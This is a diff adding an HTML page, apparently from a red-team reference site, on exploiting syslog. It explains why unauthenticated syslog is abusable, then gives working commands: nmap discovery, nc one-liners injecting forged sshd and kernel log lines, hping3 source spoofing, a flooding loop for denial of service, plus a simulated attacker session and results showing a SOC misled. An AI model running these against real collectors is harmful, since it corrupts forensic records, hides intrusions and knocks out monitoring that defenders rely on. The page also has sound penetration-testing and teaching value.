@@ -1,0 +1,168 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Syslog Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Logging & Monitoring Security</strong> • Focus: <strong>Syslog Abuse & Log Poisoning</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Syslog (UDP/514, TCP/514) is a standard protocol for message logging. 
+    Many implementations accept messages without authentication or integrity checks. 
+    Attackers exploit syslog to spoof messages, poison logs, disclose sensitive 
+    information, or flood collectors with noise (DoS). In Red Team scenarios, 
+    log tampering via syslog is used to hide malicious activity, inject false 
+    alerts, or pivot deeper into SIEM infrastructure.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Anyone can send logs to many syslog servers.</li>
+    <li><strong>No Encryption:</strong> Messages sent in plaintext, easy to sniff/alter.</li>
+    <li><strong>Spoofing Possible:</strong> Attackers can forge IPs/hostnames in logs.</li>
+    <li><strong>Information Disclosure:</strong> Logs may leak usernames, creds, or configs.</li>
+    <li><strong>Denial of Service:</strong> Flooding syslog can exhaust storage or SIEM pipelines.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify UDP/514 or TCP/514 listeners.</li>
+    <li><strong>Log Injection:</strong> Send crafted syslog messages with spoofed metadata.</li>
+    <li><strong>Log Poisoning:</strong> Insert false alerts or hide malicious activity.</li>
+    <li><strong>Flooding:</strong> Overwhelm the syslog server with noise for DoS.</li>
+    <li><strong>Impact:</strong> SOC confusion, forensic manipulation, SIEM evasion.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and detect syslog service on UDP/514 or TCP/514.</li>
+    <li>Craft custom syslog packets with spoofed hostnames/IPs.</li>
+    <li>Send false alerts or hide real events by log flooding.</li>
+    <li>Check log storage and SIEM dashboards for manipulation impact.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -sU -p514 [target]                        # Scan for syslog UDP
+nmap -sT -p514 [target]                        # Scan for syslog TCP
+
+# ------------------------------
+# Sending Fake Logs
+# ------------------------------
+echo "<13>Sep  5 12:00:00 victim sshd[1234]: Failed password for root" \
+| nc -u -w1 [target] 514
+
+# ------------------------------
+# Spoofed Source Attack (requires raw sockets)
+# ------------------------------
+hping3 --udp -s 514 -a 10.0.0.5 -p 514 -d 50 [target]
+
+# ------------------------------
+# Flooding / DoS
+# ------------------------------
+for i in {1..10000}; do \
+  echo "<14>Sep  5 12:00:00 fakehost kernel: intrusion detected $i" \
+  | nc -u -w0 [target] 514; \
+done
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -sU -p514 192.168.1.50
+echo "<14>Sep  5 12:30:00 server sshd[1111]: Accepted password for saide" \
+| nc -u 192.168.1.50 514
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -sU -p514 192.168.1.50
+PORT    STATE SERVICE
+514/udp open  syslog
+
+[ saide ~ ]$ echo "<13>Sep  5 12:00:00 victim sshd[1234]: Failed password for root" \
+| nc -u -w1 192.168.1.50 514
+[+] Fake log injected
+
+[ saide ~ ]$ echo "<14>Sep  5 12:01:00 corp-server kernel: Firewall bypass detected" \
+| nc -u -w1 192.168.1.50 514
+[+] SOC sees false alert in SIEM dashboard
+
+[ saide ~ ]$ for i in {1..5000}; do \
+> echo "<14>Sep  5 12:05:00 noise kernel: random event $i" \
+> | nc -u -w0 192.168.1.50 514; done
+[+] Syslog server overwhelmed → dropped genuine logs
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Syslog exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Injected Log Entry
+<13>Sep  5 12:00:00 victim sshd[1234]: Failed password for root
+
+# Spoofed Entry
+<14>Sep  5 12:01:00 corp-server kernel: Firewall bypass detected
+
+# Flood Attack
+5000+ fake log entries injected in <2 seconds
+Result: SOC missed real attacker activity due to noise
+
+# Proof of Log Poisoning
+SIEM dashboard shows fake alerts + attacker-controlled events
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-syslog" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Syslog
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1565/002/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Data Manipulation: Log Injection
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Inject fake logs → Poison SIEM → Hide traces or mislead SOC.</li>
+  </ul>
+</section>
